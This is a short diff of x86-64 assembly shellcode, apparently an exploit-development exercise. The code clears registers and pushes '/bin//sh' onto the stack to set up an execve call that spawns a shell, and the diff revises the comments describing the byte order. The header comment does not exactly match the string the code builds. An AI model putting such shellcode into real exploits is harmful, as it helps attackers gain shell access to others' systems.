@@ -11,12 +11,13 @@ xor rax, rax
 xor rdi, rdi
 xor rsi, rsi
 xor rdx, rdx
+xor rcx, rcx
 
 ;//bin/sh =  2f, 2f, 62, 69, 6e, 2f, 73, 68
-;push n / s h
+;push  n i b /
 push rsi
 push 0x6e69622f
-;push  i b / /
+;push   h s / /
 mov dword [rsp+4], 0x68732f2f
 
 ;execve(path -> rdi, args -> rsi, envp -> dl)
